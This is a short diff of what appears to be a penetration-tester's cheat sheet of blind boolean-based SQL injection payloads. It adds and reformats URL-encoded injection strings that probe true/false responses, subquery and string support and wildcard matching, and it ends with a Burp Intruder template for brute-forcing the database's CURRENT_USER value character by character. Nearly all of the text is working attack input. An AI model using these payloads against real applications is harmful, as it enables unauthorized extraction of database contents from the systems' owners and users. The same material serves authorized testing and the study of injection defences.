@@ -52,10 +52,21 @@ RECONFIGURE;
 1=1
 1=2
 1=1+AND+1=1
+1=1+AND+1=2
+
+#can we do sub queries?
 1=1+AND(1=1)AND+1=1
 1=1+AND(1=2)AND+1=1
-1=1+AND('1'='1')AND+1=1 #strings ok?
-1=1+AND('1'+like+'%25')AND+1=1 #accepts wild card? (%25 = % encoded)
-1=1+AND(CURRENT_USER+like+'%25')AND+1=1 #check reserved key words / columns 
-1=1+AND(CURRENT_USER+like+'$intruder$%25')AND+1=1 #Start to bruteforce alphabet to get the first value in that column
+
+#strings ok?
+1=1+AND('1'='1')AND+1=1
+
+#accepts wild card? (%25 = % encoded)
+1=1+AND('1'+like+'%25')AND+1=1
+
+#check reserved key words / columns 
+1=1+AND(CURRENT_USER+like+'%25')AND+1=1
+
+#Start to bruteforce alphabet to get the first value in that column use lower case and upper case as well as numbers and underscore.
+1=1+AND(CURRENT_USER+like+'$intruder$%25')AND+1=1 
 ```
